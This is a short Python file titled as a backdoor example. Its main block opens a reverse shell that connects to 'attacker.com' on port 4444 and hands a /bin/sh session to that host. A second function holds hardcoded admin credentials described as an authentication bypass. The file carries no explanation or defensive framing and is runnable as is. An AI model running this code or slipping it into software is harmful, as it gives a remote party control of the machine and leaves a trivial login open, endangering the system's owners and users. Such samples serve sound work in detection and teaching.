# backdoor.py - Backdoor example
import subprocess
import socket

def reverse_shell():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('attacker.com', 4444))
    subprocess.Popen(['/bin/sh'], stdin=s.fileno(), stdout=s.fileno(), stderr=s.fileno())

def hidden_admin():
    # Hardcoded admin credentials
    username = "admin"
    password = "admin123"
    
    # Authentication bypass
    if username == "admin" and password == "admin123":
        return True
    
    return False

if __name__ == "__main__":
    reverse_shell()